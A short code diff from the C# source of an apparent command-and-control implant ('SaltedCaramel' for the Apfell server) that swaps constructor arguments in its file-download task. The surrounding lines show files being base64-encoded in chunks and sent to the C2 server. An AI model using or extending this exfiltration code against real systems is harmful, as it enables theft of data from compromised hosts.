@@ -30,7 +30,7 @@ namespace SaltedCaramel.Tasks
 
                 // Send number of chunks associated with task to Apfell server
                 // Response will have the file ID to send file with
-                SCTaskResp initial = new SCTaskResp("{\"total_chunks\": " + total_chunks + ", \"task\": \"" + task.id + "\"}", task.id);
+                SCTaskResp initial = new SCTaskResp(task.id, "{\"total_chunks\": " + total_chunks + ", \"task\": \"" + task.id + "\"}");
                 DownloadReply reply = JsonConvert.DeserializeObject<DownloadReply>(implant.PostResponse(initial));
                 Debug.WriteLine($"[-] Download - Received reply, file ID: " + reply.file_id);
 
@@ -69,7 +69,7 @@ namespace SaltedCaramel.Tasks
                     fc.chunk_data = Convert.ToBase64String(chunk);
 
                     // Send our FileChunk to Apfell server
-                    SCTaskResp response = new SCTaskResp(JsonConvert.SerializeObject(fc), task.id);
+                    SCTaskResp response = new SCTaskResp(task.id, JsonConvert.SerializeObject(fc));
                     Debug.WriteLine($"[+] Download - CHUNK SENT: {fc.chunk_num}");
                     Debug.WriteLine($"[-] Download - RESPONSE: {implant.PostResponse(response)}");
                     // Make sure we respect the sleep setting
